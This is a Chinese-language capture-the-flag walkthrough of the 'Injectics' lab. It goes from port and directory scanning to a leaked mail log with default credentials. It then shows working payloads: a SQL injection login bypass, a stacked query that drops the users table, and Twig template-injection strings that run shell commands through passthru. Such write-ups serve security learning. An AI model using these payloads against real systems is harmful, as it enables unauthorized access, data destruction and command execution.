# Injectics

端口扫描

```shell
sudo nmap --min-rate 10000 -p- 10.10.118.75

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

详细端口扫描

```shell
sudo nmap -sT -sV -sC -O -p22,80 10.10.118.75

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:10:5c:4e:bd:36:0f:68:f1:26:41:6f:e0:f4:5d:30 (RSA)
|   256 86:43:7e:97:30:db:6b:9a:0b:2a:c2:f9:f7:4e:81:2e (ECDSA)
|_  256 4d:df:c2:c2:00:56:b0:e2:4a:1c:5d:ca:c2:54:9c:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Injectics Leaderboard
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

登录到网站之后发现有一个登录入口，分为普通用户登录和管理员登录

进行目录扫描看看有没有什么敏感文件

```shell
sudo dirsearch -u 10.10.118.75

200 -   48B  - /composer.json                                    
200 -    9KB - /composer.lock
301 -  310B  - /css  ->  http://10.10.118.75/css/                
302 -    0B  - /dashboard.php  ->  dashboard.php                 
301 -  312B  - /flags  ->  http://10.10.118.75/flags/            
301 -  317B  - /javascript  ->  http://10.10.118.75/javascript/                                   
200 -    1KB - /login.php                                        
302 -    0B  - /logout.php  ->  index.php                        
200 -    1KB - /mail.log                                         
301 -  317B  - /phpmyadmin  ->  http://10.10.118.75/phpmyadmin/  
200 -    3KB - /phpmyadmin/doc/html/index.html                   
200 -    3KB - /phpmyadmin/                                      
200 -    3KB - /phpmyadmin/index.php                                                             
200 -    0B  - /vendor/autoload.php
200 -    0B  - /vendor/composer/autoload_classmap.php            
200 -    0B  - /vendor/composer/autoload_psr4.php
200 -    0B  - /vendor/composer/autoload_real.php
200 -    0B  - /vendor/composer/autoload_files.php
200 -    0B  - /vendor/composer/autoload_namespaces.php          
200 -    0B  - /vendor/composer/autoload_static.php
200 -   12KB - /vendor/composer/installed.json
200 -    1KB - /vendor/composer/LICENSE
200 -    0B  - /vendor/composer/ClassLoader.php
```

找到一个mail.log文件

```html
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm

```

意思是如果user表被删除了上面的账号密码就可以进行使用了，也就是我们需要尝试删掉user表，这样就可以拿到管理员的密码了



还有一个composer.json的文件

```html
require	
twig/twig	"2.14.0"
```

告诉我们该网站使用twig模板，那么就可能存在ssti漏洞



我们首先尝试以普通用户登录，但我们并没有找到任何有关普通用户的邮箱密码，我们用万能密码经行尝试

```
' OR 'x'='x'#;
```

登录成功，我们可以对表单进行编辑操作，尝试进行删除表的操作

```http
rank=1&country=&gold=22;DROP+TABLE+users;&silver=21&bronze=12345
```

删除成功

使用之前发现的账号密码以管理员权限登录

这是我们又之前发现的twig，可以尝试ssti

最开始我在编辑页面尝试，但发现只能输入数字，之后又发现管理员可以更改自己的用户名并且会在前端页面显示出来，那么在这里输入{{7*7}}进行验证，而前端也是很幸运的出现了49，那么就确认了存在ssti漏洞，直接尝试获取到flag

```shell
{{[ 'ls' , "" ]| sort ( 'passthru' )}}

{{[ 'cd+flags;ls' , "" ]| sort ( 'passthru' )}}

{{[ 'cat+flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt;ls' , "" ]| sort ( 'passthru' )}}
```

就此拿到flag